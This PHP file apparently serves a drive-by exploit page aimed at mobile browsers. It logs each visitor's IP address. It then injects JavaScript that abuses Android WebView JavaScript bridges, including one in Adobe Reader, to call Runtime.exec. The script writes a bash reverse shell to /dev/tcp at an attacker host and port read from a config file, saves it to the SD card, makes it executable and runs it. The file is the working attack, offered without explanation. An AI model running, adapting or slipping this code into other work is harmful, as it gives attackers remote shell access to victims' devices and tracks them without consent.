<?php
$config = parse_ini_file("configuration.ini", 1);
$rhost = $config["section_01"]["rhost"];
$rport = $config["section_01"]["rport"];


if(strstr($_SERVER['HTTP_USER_AGENT'],'iPod') ||   strstr($_SERVER['HTTP_USER_AGENT'],'iPhone') || strstr($_SERVER['HTTP_USER_AGENT'],'iPad') || strstr($_SERVER['HTTP_USER_AGENT'],'Android')){ 
	$ip = $_SERVER['REMOTE_ADDR'];
	$fopen = fopen("stats.html", "a");
	fwrite($fopen, $geoip ." / " .  $ip . "<br />\n");
	fclose($fopen);
	echo "<script>\n"; 
	echo "function exec(cmd){\n"; 
	echo "  return window.jsinterface.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec(cmd);\n"; 
	echo "}\n"; 
	echo "\n"; 
	echo "exec(['/system/bin/sh','-c','echo \\\"bash -i >& /dev/tcp/$rhost/$rport 0>&1\\\" > /mnt/sdcard/rshell.sh']);\n"; 
	echo "exec(['chmod', '700', '/mnt/sdcard/rshell.sh']).waitFor();\n"; 
	echo "exec(['/mnt/sdcard/rshell.sh']);\n"; 
	echo "\n"; 
	echo "</script>\n";

	echo "<script>\n"; 
    echo "function execute(bridge, cmd) {\n"; 
    echo "   return bridge.getClass().forName('java.lang.Runtime')\n"; 
    echo "      .getMethod('getRuntime',null).invoke(null,null).exec(cmd);\n"; 
    echo "}\n"; 
    echo "\n"; 
    echo "if(window._app) {\n"; 
    echo "   try {\n"; 
    echo "      var path = '/data/data/com.adobe.reader/mobilereader.poc.txt';\n"; 
    echo "      execute(window._app, ['/system/bin/sh','-c','echo \\\"bash -i >& /dev/tcp/$rhost/$rport 0>&1\\\" > /mnt/sdcard/rshell.sh']);\n"; 
    echo "      execute(window._app, ['chmod', '700', '/mnt/sdcard/rshell.sh']);\n"; 
    echo "      execute(window._app, ['/mnt/sdcard/rshell.sh']);\n"; 
    echo "      window._app.alert(path + ' created', 3);\n"; 
    echo "   } catch(e) {\n"; 
    echo "      window._app.alert(e, 0);\n"; 
    echo "   }\n"; 
    echo "}\n"; 
    echo "</script>\n";
}
?>